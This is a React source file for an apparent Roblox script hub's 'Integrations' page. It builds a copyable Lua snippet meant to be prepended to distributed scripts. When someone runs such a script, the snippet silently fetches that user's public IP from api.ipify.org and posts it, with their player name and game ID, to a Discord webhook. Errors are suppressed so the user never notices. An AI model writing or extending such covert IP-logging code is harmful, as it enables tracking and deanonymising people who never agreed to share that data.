"use client";

import { useState, useEffect } from "react";

export default function IntegrationsPage() {
  const [webhook, setWebhook] = useState("");
  const [ipLog, setIpLog] = useState(true);
  const [saved, setSaved] = useState(false);

  useEffect(() => {
    try {
      const w = localStorage.getItem("emorce_webhook");
      if (w) setWebhook(w);
      const i = localStorage.getItem("emorce_iplog");
      if (i) setIpLog(i === "1");
    } catch {}
  }, []);

  function save() {
    localStorage.setItem("emorce_webhook", webhook);
    localStorage.setItem("emorce_iplog", ipLog ? "1" : "0");
    setSaved(true);
    setTimeout(() => setSaved(false), 2000);
  }

  const wh = webhook || "YOUR_WEBHOOK";
  const ipSnippet =
    "-- EmorceHub IP Integration\n" +
    "pcall(function()\n" +
    '  local url = "' + wh + '"\n' +
    '  if url == "" or url == "YOUR_WEBHOOK" then return end\n' +
    '  local ip = "unknown"\n' +
    "  pcall(function()\n" +
    '    ip = game:HttpGet("https://api.ipify.org")\n' +
    "  end)\n" +
    '  local name = game:GetService("Players").LocalPlayer.Name\n' +
    '  local data = game:GetService("HttpService"):JSONEncode({\n' +
    '    content = "**EmorceHub** · " .. name .. " · " .. ip .. " · " .. tostring(game.PlaceId)\n' +
    "  })\n" +
    "  if request then\n" +
    '    request({Url=url, Method="POST", Headers={["Content-Type"]="application/json"}, Body=data})\n' +
    "  end\n" +
    "end)\n";

  return (
    <div className="p-6 max-w-2xl space-y-6">
      <div>
        <h1 className="text-xl font-bold text-white">Integrations</h1>
        <p className="text-sm text-[#9a9ab0]">
          Send executor IP + player name to your webhook when the script runs.
        </p>
      </div>
      <div className="rounded-xl border border-[#1a1a24] bg-[#0c0c12] p-5 space-y-4">
        <div>
          <div className="text-[10px] text-[#6b6b80] tracking-widest font-mono mb-1">
            // DISCORD WEBHOOK URL
          </div>
          <input
            value={webhook}
            onChange={(e) => setWebhook(e.target.value)}
            placeholder="https://discord.com/api/webhooks/..."
            className="w-full px-3 py-2 rounded-lg bg-[#050508] border border-[#1a1a24] text-sm"
          />
        </div>
        <label className="flex items-center gap-2 text-sm text-[#9a9ab0]">
          <input
            type="checkbox"
            checked={ipLog}
            onChange={(e) => setIpLog(e.target.checked)}
          />
          Enable IP log snippet
        </label>
        <button
          type="button"
          onClick={save}
          className="w-full py-2.5 rounded-lg bg-[#c41e3a] text-white text-sm font-medium"
        >
          {saved ? "Saved" : "Save Integration"}
        </button>
        <div>
          <div className="text-[10px] text-[#6b6b80] tracking-widest font-mono mb-1">
            // PREPEND TO SCRIPT
          </div>
          <textarea
            readOnly
            value={ipSnippet}
            rows={14}
            className="w-full px-3 py-2 rounded-lg bg-[#050508] border border-[#1a1a24] text-[11px] font-mono text-[#b8b8c8]"
          />
          <button
            type="button"
            onClick={() => navigator.clipboard.writeText(ipSnippet)}
            className="mt-2 text-xs text-[#9a9ab0] border border-[#1a1a24] px-3 py-1.5 rounded-lg"
          >
            copy snippet
          </button>
        </div>
      </div>
    </div>
  );
}
